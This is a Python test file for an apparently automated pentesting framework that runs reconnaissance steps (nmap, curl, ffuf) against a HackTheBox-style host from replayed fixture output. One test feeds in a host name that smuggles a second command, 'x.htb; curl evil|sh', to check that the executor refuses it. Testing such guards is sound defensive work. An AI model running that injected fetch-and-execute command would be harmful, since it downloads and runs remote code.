"""ReplayExecutor tests — the full pure-Python boundary driving real OODA steps.

Proves that plan_action -> backend -> parse_* wired behind the Loop's Executor
protocol actually advances the graph and the phase machine, and that refused /
adapterless actions degrade to a note instead of crashing or faking success.

    PYTHONPATH=. PYTHONIOENCODING=utf-8 python tests/test_replay_executor.py
"""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lotusmcp.engine.candidate import CandidateAction
from lotusmcp.engine.loop import Loop
from lotusmcp.executor.replay import FixtureBackend, ReplayExecutor
from lotusmcp.kernel.case import Case
from lotusmcp.kernel.events import EventDraft
from lotusmcp.ontology.identity import entity_id
from lotusmcp.playbooks.model import World

HOST = "10.10.11.53"

NMAP_XML = """<?xml version="1.0"?><nmaprun><host>
 <address addr="10.10.11.53" addrtype="ipv4"/>
 <ports>
  <port protocol="tcp" portid="80"><state state="open"/>
   <service name="http" product="nginx" version="1.25.3"/></port>
 </ports></host></nmaprun>"""

CURL_GIT = "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\n\r\nref: refs/heads/main"
CURL_ROOT = "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\n\r\n<html>Titan</html>"
FFUF = ('{"results":[{"input":{"FUZZ":"admin"},"status":401},'
        '{"input":{"FUZZ":"login"},"status":200}]}')

FIXTURES = {
    "nmap": NMAP_XML,
    "curl /": CURL_ROOT,
    "curl /.git/HEAD": CURL_GIT,
    "ffuf": FFUF,
}


def _action(capability, params, target_id, phase_gate=("RECON",)):
    return CandidateAction(
        capability=capability, category="recon", target_id=target_id,
        target_display="t", params=params, rule_id="r", rationale="",
        phase_gate=phase_gate,
    )


def _case_with_host():
    base = Path(tempfile.mkdtemp(prefix="lotus_replay_"))
    case = Case.create(base, "replay", title="t", category="web",
                       flag_format=r"flag\{[^}]+\}", platform="HackTheBox")
    case.append(EventDraft("entity.asserted", {"kind": "executor", "name": "seed"},
                           {"kind": "host", "natural_key": {"addr": HOST}}))
    return case


def test_port_scan_through_boundary_populates_graph():
    case = _case_with_host()
    ex = ReplayExecutor(FixtureBackend(FIXTURES))
    hid = entity_id("host", {"addr": HOST})
    for d in ex.run(_action("port_scan", {"probe": "top1000"}, hid), case):
        case.append(d)
    world = World.from_graph_db(case.rebuild()["graph_db"])
    svc = world.entities("service.http")
    assert len(svc) == 1 and svc[0].attr("version") == "1.25.3", svc


def test_refused_action_yields_note_not_crash():
    """A hostile discovered host reaches the executor; the argv choke refuses it
    and the executor reports a note rather than running anything."""
    base = Path(tempfile.mkdtemp(prefix="lotus_replay_evil_"))
    case = Case.create(base, "evil", title="t", category="web", flag_format=r"f\{.*\}")
    evil = {"addr": "x.htb; curl evil|sh"}
    case.append(EventDraft("entity.asserted", {"kind": "executor", "name": "vhost"},
                           {"kind": "host", "natural_key": evil}))
    ex = ReplayExecutor(FixtureBackend(FIXTURES))
    drafts = ex.run(_action("port_scan", {"probe": "top1000"}, entity_id("host", evil)), case)
    assert len(drafts) == 1 and drafts[0].type == "note.added"
    assert "refused" in drafts[0].payload["text"]


def test_regime_b_capability_yields_note():
    case = _case_with_host()
    ex = ReplayExecutor(FixtureBackend(FIXTURES))
    drafts = ex.run(_action("web_attack", {"class": "sqli"}, entity_id("host", {"addr": HOST}),
                            phase_gate=("EXPLOIT",)), case)
    assert len(drafts) == 1 and drafts[0].type == "note.added"
    assert "Regime-B" in drafts[0].payload["text"]


def test_loop_drives_recon_and_enumerate_through_real_adapters():
    """The Loop, given ReplayExecutor, walks TRIAGE->RECON->ENUMERATE building
    the graph entirely through plan_action + parse_* — no scripted events."""
    case = _case_with_host()
    # give it an http service to start so RECON http_probe / ENUM rules can fire
    case.append(EventDraft("entity.asserted", {"kind": "executor", "name": "seed"},
                           {"kind": "service.http",
                            "natural_key": {"host": HOST, "proto": "tcp", "port": 80}}))
    loop = Loop(case, ReplayExecutor(FixtureBackend(FIXTURES)))
    phases_seen = set()
    for _ in range(12):
        r = loop.step()
        phases_seen.add(r.phase)
        if r.halted:
            break
    world = World.from_graph_db(case.rebuild()["graph_db"])
    # the http banner probe folded server/version via the real curl parser
    svc = world.entities("service.http")
    assert svc and svc[0].attr("version") == "1.25.3", svc
    # the .git probe raised an exposure finding via the real curl parser, which
    # correctly drove ENUMERATE -> EXPLOIT (high-severity access signal)
    assert any(f.ftype == "exposure" for f in world.findings), world.findings
    assert {"RECON", "ENUMERATE", "EXPLOIT"} <= phases_seen, phases_seen


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items())
           if k.startswith("test_") and callable(v)]
    failed = 0
    for fn in fns:
        try:
            fn()
            print(f"  ok  {fn.__name__}")
        except Exception as e:  # noqa: BLE001
            failed += 1
            print(f"FAIL  {fn.__name__}: {e}")
    print(f"\n{len(fns) - failed}/{len(fns)} passed")
    sys.exit(1 if failed else 0)
